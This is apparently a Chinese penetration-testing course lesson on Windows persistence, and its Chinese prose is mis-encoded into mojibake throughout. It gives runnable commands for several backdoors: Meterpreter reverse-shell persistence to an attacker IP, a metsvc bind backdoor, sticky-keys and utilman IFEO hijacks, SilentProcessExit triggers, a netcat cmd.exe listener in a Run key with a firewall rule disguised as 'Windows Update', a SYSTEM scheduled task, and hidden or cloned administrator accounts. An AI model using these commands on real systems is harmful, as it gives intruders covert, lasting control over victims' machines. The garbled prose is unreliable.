# è¯¾ç¨‹P82ï¼šç¬¬53å¤© - Windowsæƒé™ç»´æŒæŠ€æœ¯è¯¦è§£ ğŸ”

åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†ç³»ç»Ÿæ€§åœ°å­¦ä¹ Windowsæ“ä½œç³»ç»Ÿä¸‹çš„æƒé™ç»´æŒæŠ€æœ¯ã€‚æƒé™ç»´æŒçš„ç›®çš„æ˜¯ç¡®ä¿æˆ‘ä»¬é€šè¿‡æ¸—é€æµ‹è¯•è·å–çš„ç›®æ ‡ç³»ç»Ÿè®¿é—®æƒé™ä¸ä¼šå› æ¼æ´ä¿®å¤æˆ–ç®¡ç†å‘˜å¹²é¢„è€Œè½»æ˜“ä¸¢å¤±ã€‚è¯¾ç¨‹å†…å®¹å°†åˆ†ä¸ºå››ä¸ªä¸»è¦éƒ¨åˆ†ï¼šMeterpreteræƒé™ç»´æŒã€ç³»ç»Ÿå·¥å…·æ›¿æ¢åé—¨ã€å¼€æœºè‡ªå¯åŠ¨æ³¨å†Œè¡¨é¡¹ä»¥åŠå…¶ä»–å®ç”¨æŠ€å·§ã€‚

---

## ç¬¬ä¸€éƒ¨åˆ†ï¼šMeterpreteræƒé™ç»´æŒ âš™ï¸

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_1.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_3.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_4.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬æ¦‚è¿°äº†è¯¾ç¨‹ç»“æ„ï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹Meterpreteræ¡†æ¶ä¸‹çš„æƒé™ç»´æŒæŠ€æœ¯ã€‚Meterpreteræ˜¯Metasploitæ¡†æ¶çš„ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„æ‰©å±•ï¼Œå®ƒé›†æˆäº†è®¸å¤šåæ¸—é€æ¨¡å—ï¼Œæ–¹ä¾¿æˆ‘ä»¬è¿›è¡Œå„ç§æ“ä½œã€‚

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_6.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_7.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_9.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_11.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_13.png)

æƒé™ç»´æŒï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯ç»´æŒæˆ‘ä»¬å·²è·å–çš„è®¿é—®æƒé™ã€‚è¿™äº›æƒé™å¯èƒ½æ¥æºäºWeb Shellã€å†…ç½‘æ¨ªå‘ç§»åŠ¨ç­‰ã€‚ä¸ºäº†åœ¨æ¼æ´ä¿®å¤æˆ–ç®¡ç†å‘˜å‘ç°åä»èƒ½æ§åˆ¶ç›®æ ‡ï¼Œæˆ‘ä»¬é€šå¸¸éœ€è¦å®‰è£…åé—¨ç¨‹åºã€‚

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_15.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_16.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_18.png)

Meterpreteræä¾›äº†ä¸¤ç§ä¸»è¦çš„æƒé™ç»´æŒæŠ€æœ¯ï¼š

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_20.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_22.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_24.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_26.png)

1.  **`persistence` æ¨¡å—**ï¼šè¿™æ˜¯ä¸€ä¸ªåŸºäºæ³¨å†Œè¡¨çš„å¯åŠ¨é¡¹åé—¨ã€‚å…¶åŸç†æ˜¯ä¸Šä¼ ä¸€ä¸ªVBSè„šæœ¬åˆ°ç›®æ ‡æœºå™¨ï¼Œå¹¶ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œä½¿å¾—ç³»ç»Ÿå¯åŠ¨æˆ–ç”¨æˆ·ç™»å½•æ—¶è‡ªåŠ¨æ‰§è¡Œè¯¥è„šæœ¬ï¼Œä»è€Œåå¼¹ä¸€ä¸ªä¼šè¯è¿æ¥å›æ”»å‡»æœºã€‚
2.  **`metsvc` æ¨¡å—**ï¼šè¿™æ˜¯ä¸€ä¸ªæœåŠ¡åé—¨ã€‚å®ƒä¼šåœ¨ç›®æ ‡Windowsç³»ç»Ÿä¸Šåˆ›å»ºä¸€ä¸ªåä¸º`Meterpreter`çš„æœåŠ¡ï¼Œå¹¶ç›‘å¬ä¸€ä¸ªç‰¹å®šç«¯å£ï¼ˆé»˜è®¤31337ï¼‰ã€‚æ”»å‡»è€…åªéœ€è¿æ¥è¯¥ç«¯å£å³å¯è·å¾—ä¸€ä¸ªMeterpreterä¼šè¯ã€‚

### `persistence` æ¨¡å—è¯¦è§£

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_28.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_30.png)

è¯¥æ¨¡å—çš„åŸç†æ˜¯ä¸Šä¼ å¹¶æ‰§è¡Œä¸€ä¸ªVBSè„šæœ¬ï¼Œé€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨å®ç°æŒä¹…åŒ–ã€‚

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_32.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_34.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_36.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_38.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_40.png)

**æ ¸å¿ƒå‘½ä»¤ä¸å‚æ•°ï¼š**
åœ¨è·å–Meterpreterä¼šè¯åï¼Œå¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å¸®åŠ©ï¼š
```bash
run persistence -h
```

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_42.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_44.png)

ä»¥ä¸‹æ˜¯è¯¥æ¨¡å—çš„ä¸€äº›å…³é”®é€‰é¡¹ï¼š

*   **`-X`**: ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªå¯åŠ¨ã€‚
*   **`-U`**: ç”¨æˆ·ç™»å½•æ—¶è‡ªå¯åŠ¨ã€‚
*   **`-S`**: ä½œä¸ºæœåŠ¡å¯åŠ¨ï¼ˆåŒæ ·å†™å…¥æ³¨å†Œè¡¨ï¼‰ã€‚
*   **`-L`**: æŒ‡å®šè¿œç¨‹ä¸»æœºä¸ŠVBSè„šæœ¬çš„å­˜æ”¾è·¯å¾„ã€‚é»˜è®¤ä¸º`%TEMP%`ç›®å½•ï¼Œä½†è¯¥ç›®å½•æ–‡ä»¶å¯èƒ½åœ¨é‡å¯åè¢«æ¸…é™¤ï¼Œå»ºè®®æŒ‡å®šæ›´æŒä¹…çš„è·¯å¾„ï¼Œå¦‚`C:\Windows\System32`ã€‚
*   **`-P`**: æŒ‡å®šä½¿ç”¨çš„Payloadã€‚é»˜è®¤æ˜¯`windows/meterpreter/reverse_tcp`ï¼ˆ32ä½ï¼‰ã€‚å¦‚æœç›®æ ‡ç³»ç»Ÿæ˜¯64ä½ï¼Œéœ€æŒ‡å®šå¯¹åº”çš„64ä½Payloadï¼Œä¾‹å¦‚`windows/x64/meterpreter/reverse_tcp`ã€‚
*   **`-i`**: è®¾ç½®åå‘è¿æ¥çš„æ—¶é—´é—´éš”ï¼ˆç§’ï¼‰ã€‚
*   **`-p`**: è®¾ç½®åå‘è¿æ¥çš„ç«¯å£å·ã€‚
*   **`-r`**: è®¾ç½®åå‘è¿æ¥çš„IPåœ°å€ï¼ˆæ”»å‡»æœºIPï¼‰ã€‚

**ä½¿ç”¨ç¤ºä¾‹ï¼š**
å‡è®¾æ”»å‡»æœºIPä¸º`192.168.1.100`ï¼Œç›®æ ‡ä¸º64ä½ç³»ç»Ÿã€‚
```bash
run persistence -X -U -i 5 -p 4444 -r 192.168.1.100 -P windows/x64/meterpreter/reverse_tcp
```
æ‰§è¡Œæ­¤å‘½ä»¤åï¼Œæ¨¡å—ä¼šï¼š
1.  åœ¨ç›®æ ‡`%TEMP%`ç›®å½•ç”Ÿæˆä¸€ä¸ªVBSè„šæœ¬ã€‚
2.  åœ¨æ³¨å†Œè¡¨`HKLM\Software\Microsoft\Windows\CurrentVersion\Run`ï¼ˆç³»ç»Ÿå¯åŠ¨ï¼‰å’Œ`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`ï¼ˆç”¨æˆ·ç™»å½•ï¼‰ä¸‹åˆ›å»ºé¡¹ï¼Œå…¶å€¼ä¸ºVBSè„šæœ¬çš„è·¯å¾„ã€‚
3.  å½“ç³»ç»Ÿé‡å¯æˆ–ç”¨æŒ‡å®šç”¨æˆ·ç™»å½•æ—¶ï¼Œä¼šè‡ªåŠ¨æ‰§è¡ŒVBSè„šæœ¬ï¼Œåå¼¹ä¼šè¯åˆ°æ”»å‡»æœºçš„4444ç«¯å£ã€‚

**æ³¨æ„**ï¼šVBSè„šæœ¬å®¹æ˜“è¢«å®‰å…¨è½¯ä»¶æŸ¥æ€ï¼Œæ­¤æ–¹æ³•åœ¨å­˜åœ¨æ€è½¯çš„ç¯å¢ƒä¸­å¯èƒ½å¤±æ•ˆã€‚

### `metsvc` æ¨¡å—è¯¦è§£

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_46.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_48.png)

è¿™æ˜¯ä¸€ä¸ªæ›´ç®€å•çš„æœåŠ¡åé—¨ã€‚

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_50.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_52.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_54.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_56.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_58.png)

**ä½¿ç”¨ç¤ºä¾‹ï¼š**
åœ¨Meterpreterä¼šè¯ä¸­ç›´æ¥è¿è¡Œï¼š
```bash
run metsvc
```
è¯¥å‘½ä»¤ä¼šï¼š
1.  åœ¨ç›®æ ‡ç³»ç»Ÿåˆ›å»º`Meterpreter`æœåŠ¡ã€‚
2.  ä¸Šä¼ å¿…è¦çš„æ–‡ä»¶åˆ°ä¸´æ—¶ç›®å½•ã€‚
3.  å¯åŠ¨æœåŠ¡ï¼Œç›‘å¬31337ç«¯å£ã€‚

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_59.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_61.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_63.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_65.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_67.png)

**è¿æ¥åé—¨ï¼š**
åœ¨MSFä¸­ï¼Œä½¿ç”¨æ­£å‘è¿æ¥Payloadè¿æ¥ç›®æ ‡ç«¯å£å³å¯è·å¾—ä¼šè¯ã€‚
```bash
use exploit/multi/handler
set payload windows/metsvc_bind_tcp
set RHOST <ç›®æ ‡IP>
set LPORT 31337
exploit
```

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_69.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_71.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_73.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_75.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_77.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_79.png)

### è‡ªåŠ¨åŒ–æƒé™ç»´æŒ

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_81.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_83.png)

åœ¨è®¾ç½®MSFç›‘å¬å™¨æ—¶ï¼Œå¯ä»¥ä½¿ç”¨`AutoRunScript`å‚æ•°å®ç°è‡ªåŠ¨åŒ–ã€‚å½“æœ‰æ–°ä¼šè¯å»ºç«‹æ—¶ï¼Œè‡ªåŠ¨æ‰§è¡Œæƒé™ç»´æŒè„šæœ¬ã€‚
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 5555
set AutoRunScript persistence -X -U -i 10 -p 5566 -r 192.168.1.100
exploit
```
**æ³¨æ„**ï¼šåå¼¹Shellçš„ç«¯å£ï¼ˆ`LPORT 5555`ï¼‰å’ŒæŒä¹…åŒ–è„šæœ¬è¿æ¥çš„ç«¯å£ï¼ˆ`-p 5566`ï¼‰åº”è®¾ç½®ä¸ºä¸åŒç«¯å£ï¼Œé¿å…å†²çªã€‚

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_85.png)

---

## ç¬¬äºŒéƒ¨åˆ†ï¼šç³»ç»Ÿå·¥å…·æ›¿æ¢åé—¨ ğŸ› ï¸

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_87.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_88.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬ä»‹ç»äº†Meterpreterçš„è‡ªåŠ¨åŒ–å·¥å…·ï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•åˆ©ç”¨Windowsç³»ç»Ÿè‡ªå¸¦çš„è¾…åŠ©å·¥å…·å®ç°æ›´éšè”½çš„æƒé™ç»´æŒã€‚

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_90.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_92.png)

Windowsè¾…åŠ©åŠŸèƒ½ï¼ˆå¦‚å±å¹•é”®ç›˜ã€è®²è¿°äººã€æ”¾å¤§é•œç­‰ï¼‰æ—¨åœ¨å¸®åŠ©ç‰¹æ®Šäººå£«ä½¿ç”¨è®¡ç®—æœºã€‚æ”»å‡»è€…å¯ä»¥åœ¨è·å–ç³»ç»Ÿæƒé™ï¼ˆ`SYSTEM`æˆ–ç®¡ç†å‘˜ï¼‰åï¼Œé€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨ï¼ŒåŠ«æŒè¿™äº›å·¥å…·çš„å¯åŠ¨è·¯å¾„ï¼Œä½¿å…¶æ‰§è¡Œæˆ‘ä»¬çš„åé—¨ç¨‹åºã€‚

å…¶æ ¸å¿ƒåŸç†æ˜¯åˆ©ç”¨æ³¨å†Œè¡¨è·¯å¾„ï¼š`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`ã€‚åœ¨æ­¤è·¯å¾„ä¸‹ä¸ºç‰¹å®šç¨‹åºï¼ˆå¦‚`utilman.exe`ï¼‰åˆ›å»ºè°ƒè¯•é”®å€¼ï¼Œå¯ä»¥æŒ‡å®šå®é™…è¿è¡Œçš„æ›¿ä»£ç¨‹åºã€‚

### åŠ«æŒå®ä¾‹ï¼šä»¥`utilman.exe`ï¼ˆè½»æ¾è®¿é—®ä¸­å¿ƒï¼‰ä¸ºä¾‹

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_94.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_96.png)

`utilman.exe`åœ¨Windowsç™»å½•ç•Œé¢å¯é€šè¿‡ç‚¹å‡»â€œè½»æ¾è®¿é—®â€æŒ‰é’®è§¦å‘ã€‚åŠ«æŒå®ƒå¯ä»¥åœ¨æ— éœ€ç™»å½•å¯†ç çš„æƒ…å†µä¸‹è·å¾—ç³»ç»ŸShellã€‚

**æ“ä½œæ­¥éª¤ï¼š**
1.  åœ¨å·²è·å¾—æƒé™çš„CMDæˆ–Meterpreter Shellä¸­æ‰§è¡Œï¼š
    ```cmd
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe"
    ```
    è¿™æ¡å‘½ä»¤å°†`utilman.exe`çš„è°ƒè¯•å™¨è®¾ç½®ä¸º`cmd.exe`ã€‚

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_98.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_100.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_102.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_104.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_106.png)

2.  å½“åœ¨ç™»å½•ç•Œé¢ç‚¹å‡»â€œè½»æ¾è®¿é—®â€æŒ‰é’®æ—¶ï¼Œç³»ç»Ÿä¸ä¼šæ‰“å¼€è¾…åŠ©å·¥å…·ç®¡ç†å™¨ï¼Œè€Œæ˜¯ç›´æ¥å¼¹å‡ºå…·æœ‰`SYSTEM`æƒé™çš„`cmd.exe`çª—å£ã€‚

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_108.png)

**å…¶ä»–å¯åŠ«æŒçš„ç›®æ ‡ï¼š**
*   **`sethc.exe`**ï¼šç²˜æ»é”®ã€‚æŒ‰5æ¬¡Shifté”®è§¦å‘ã€‚å‘½ä»¤ï¼š
    ```cmd
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe"
    ```
*   **`osk.exe`**ï¼šå±å¹•é”®ç›˜ã€‚
*   **`narrator.exe`**ï¼šè®²è¿°äººã€‚

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_110.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_112.png)

**è‡ªåŠ¨åŒ–å·¥å…·ï¼š**
Metasploitçš„`post/windows/manage/sticky_keys`æ¨¡å—å¯ä»¥è‡ªåŠ¨åŒ–å®Œæˆä¸Šè¿°åŠ«æŒã€‚
```bash
use post/windows/manage/sticky_keys
set SESSION <ä¼šè¯ID>
set TARGET cmd # æˆ–æŒ‡å®šä½ çš„åé—¨ç¨‹åºè·¯å¾„
run
```

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_114.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_116.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_117.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_119.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_121.png)

### è¿›ç¨‹é€€å‡ºé™é»˜æ‰§è¡Œåé—¨

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_123.png)

æ­¤æŠ€æœ¯å¯ä»¥åœ¨ç‰¹å®šç¨‹åºï¼ˆå¦‚è®°äº‹æœ¬`notepad.exe`ï¼‰é€€å‡ºåï¼Œé™é»˜è¿è¡Œæˆ‘ä»¬çš„åé—¨ã€‚

**æ“ä½œæ­¥éª¤ï¼š**
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d "C:\path\to\your\backdoor.exe"
```
è®¾ç½®åï¼Œæ¯å½“ç”¨æˆ·å…³é—­è®°äº‹æœ¬ç¨‹åºï¼Œç³»ç»Ÿå°±ä¼šé™é»˜å¯åŠ¨æŒ‡å®šçš„åé—¨ç¨‹åºã€‚

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_125.png)

---

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_127.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_129.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_131.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_133.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_135.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_137.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_139.png)

## ç¬¬ä¸‰éƒ¨åˆ†ï¼šå¼€æœºè‡ªå¯åŠ¨æ³¨å†Œè¡¨é¡¹ ğŸ“

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_141.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_143.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_145.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_147.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬åˆ©ç”¨äº†ç³»ç»Ÿå·¥å…·çš„å¯åŠ¨æœºåˆ¶ï¼Œæœ¬èŠ‚æˆ‘ä»¬èšç„¦äºWindowsæœ¬èº«ç”¨äºç®¡ç†å¯åŠ¨é¡¹çš„æ ¸å¿ƒåŒºåŸŸâ€”â€”æ³¨å†Œè¡¨ã€‚äº†è§£è¿™äº›ä½ç½®å¯¹äºæƒé™ç»´æŒå’Œé˜²å¾¡æ’æŸ¥éƒ½è‡³å…³é‡è¦ã€‚

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_149.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_151.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_153.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_155.png)

Windowsé€šè¿‡ä¸€ç³»åˆ—æ³¨å†Œè¡¨é”®å€¼æ¥æ§åˆ¶ç¨‹åºçš„è‡ªå¯åŠ¨ã€‚ä»¥ä¸‹æ˜¯å¸¸è§çš„è‡ªå¯åŠ¨æ³¨å†Œè¡¨è·¯å¾„ï¼š

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_157.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_159.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_161.png)

**å¯¹æ‰€æœ‰ç”¨æˆ·ç”Ÿæ•ˆï¼ˆ`HKLM`ï¼‰:**
*   `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
*   `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`
*   `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run` (32ä½ç¨‹åºåœ¨64ä½ç³»ç»Ÿ)

**å¯¹å½“å‰ç”¨æˆ·ç”Ÿæ•ˆï¼ˆ`HKCU`ï¼‰:**
*   `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
*   `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`

**åŒºåˆ«**ï¼š`HKLM`ä¸‹çš„é¡¹å¯¹æœºå™¨ä¸Šæ‰€æœ‰ç”¨æˆ·ç”Ÿæ•ˆï¼Œ`HKCU`ä¸‹çš„é¡¹ä»…å¯¹å½“å‰ç™»å½•ç”¨æˆ·ç”Ÿæ•ˆã€‚

**åˆ©ç”¨ç¤ºä¾‹ï¼šæ·»åŠ NCåé—¨**
1.  å°†Netcat (`nc.exe`) ä¸Šä¼ è‡³ç›®æ ‡ï¼Œä¾‹å¦‚ `C:\Windows\System32\nc.exe`ã€‚
2.  æ·»åŠ ä¸€ä¸ªè‡ªå¯åŠ¨é¡¹ï¼Œä½¿ç³»ç»Ÿå¯åŠ¨æ—¶ç›‘å¬ç«¯å£ã€‚
    ```cmd
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "UpdateCheck" /t REG_SZ /d "C:\Windows\System32\nc.exe -lvp 5555 -e cmd.exe"
    ```
3.  å¦‚æœéœ€è¦ï¼Œæ”¾è¡Œé˜²ç«å¢™ç«¯å£ã€‚
    ```cmd
    netsh advfirewall firewall add rule name="Windows Update" dir=in action=allow protocol=TCP localport=5555
    ```
4.  æ”»å‡»æœºè¿æ¥ç›®æ ‡5555ç«¯å£å³å¯è·å¾—Shellã€‚

**æ³¨å†Œè¡¨æ“ä½œå‘½ä»¤ï¼š**
*   **æ·»åŠ **ï¼š`reg add <é”®è·¯å¾„> /v <å€¼åç§°> /t <ç±»å‹> /d <æ•°æ®>`
*   **æŸ¥è¯¢**ï¼š`reg query <é”®è·¯å¾„>`
*   **åˆ é™¤**ï¼š`reg delete <é”®è·¯å¾„> /f`

åœ¨Meterpreterä¸­ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨`reg`å‘½ä»¤æ“ä½œè¿œç¨‹æ³¨å†Œè¡¨ã€‚

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_163.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_165.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_167.png)

---

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_169.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_171.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_173.png)

## ç¬¬å››éƒ¨åˆ†ï¼šå…¶ä»–æƒé™ç»´æŒæŠ€å·§ ğŸ§©

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_175.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_177.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_178.png)

é™¤äº†ä¸Šè¿°æ–¹æ³•ï¼Œè¿˜æœ‰ä¸€äº›å…¶ä»–å¸¸ç”¨çš„æƒé™ç»´æŒæŠ€å·§ã€‚

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_180.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_182.png)

### 1. è®¡åˆ’ä»»åŠ¡åé—¨
Windowsè®¡åˆ’ä»»åŠ¡å¯ä»¥å®šæ—¶æ‰§è¡Œç¨‹åºï¼Œæ˜¯ç†æƒ³çš„æŒä¹…åŒ–æ–¹å¼ã€‚
```cmd
# åˆ›å»ºæ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡çš„è®¡åˆ’ä»»åŠ¡
schtasks /create /tn "SystemCheck" /tr "C:\path\to\backdoor.exe" /sc minute /mo 1 /ru SYSTEM /f
```
å‚æ•°è¯´æ˜ï¼š`/tn`ä»»åŠ¡åï¼Œ`/tr`è¦è¿è¡Œçš„ç¨‹åºï¼Œ`/sc`è®¡åˆ’é¢‘ç‡ï¼ˆminute/hourly/daily...ï¼‰ï¼Œ`/mo`é—´éš”ï¼Œ`/ru`è¿è¡Œç”¨æˆ·ã€‚

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_184.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_186.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_188.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_190.png)

### 2. å¿«æ·æ–¹å¼åŠ«æŒ
ä¿®æ”¹ç”¨æˆ·å¸¸ç”¨ç¨‹åºï¼ˆå¦‚æµè§ˆå™¨ã€åŠå…¬è½¯ä»¶ï¼‰å¿«æ·æ–¹å¼çš„â€œç›®æ ‡â€å­—æ®µï¼Œåœ¨å¯åŠ¨åŸç¨‹åºçš„åŒæ—¶é™é»˜æ‰§è¡Œåé—¨ã€‚
1.  åˆ›å»ºä¸€ä¸ªæ¶æ„è„šæœ¬ï¼ˆå¦‚`launch.vbs`ï¼‰ï¼Œå†…å®¹ä¸ºå¯åŠ¨åŸç¨‹åºå’Œåé—¨ã€‚
2.  å°†å¿«æ·æ–¹å¼çš„â€œç›®æ ‡â€æŒ‡å‘è¯¥VBSè„šæœ¬ã€‚
3.  æ›´æ”¹å¿«æ·æ–¹å¼å›¾æ ‡ï¼Œä½¿å…¶çœ‹èµ·æ¥ä¸åŸç¨‹åºä¸€è‡´ã€‚

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_192.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_193.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_194.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_195.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_197.png)

### 3. éšè—ç”¨æˆ·è´¦æˆ·
*   **ç®€å•éšè—**ï¼šåˆ›å»ºä»¥`$`ç»“å°¾çš„ç”¨æˆ·åï¼Œå¦‚`admin$`ã€‚è¯¥ç”¨æˆ·åœ¨`net user`å‘½ä»¤ä¸­ä¸å¯è§ï¼Œä½†åœ¨æ§åˆ¶é¢æ¿ä¸­å¯è§ã€‚
    ```cmd
    net user admin$ Password123! /add
    net localgroup administrators admin$ /add
    ```
*   **å…‹éš†è´¦æˆ·**ï¼šæ›´éšè”½çš„æ–¹æ³•ã€‚é€šè¿‡å¯¼å‡º`Administrator`è´¦æˆ·åœ¨æ³¨å†Œè¡¨`SAM`æ•°æ®åº“ä¸­çš„ç‰¹å®šé”®å€¼ï¼ˆFå€¼ï¼‰ï¼Œå¹¶å°†å…¶å¯¼å…¥åˆ°ä¸€ä¸ªæ–°å»ºçš„éšè—è´¦æˆ·ä¸­ï¼Œä½¿è¯¥è´¦æˆ·æ‹¥æœ‰ä¸Administratorç›¸åŒçš„æƒé™ï¼Œä¸”åœ¨å‘½ä»¤è¡Œå’Œæ§åˆ¶é¢æ¿ä¸­éƒ½ä¸å¯è§ã€‚æ­¤æ“ä½œéœ€è¦å¯¹æ³¨å†Œè¡¨`HKLM\SAM\SAM`æœ‰å®Œå…¨æ§åˆ¶æƒé™ã€‚

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_199.png)

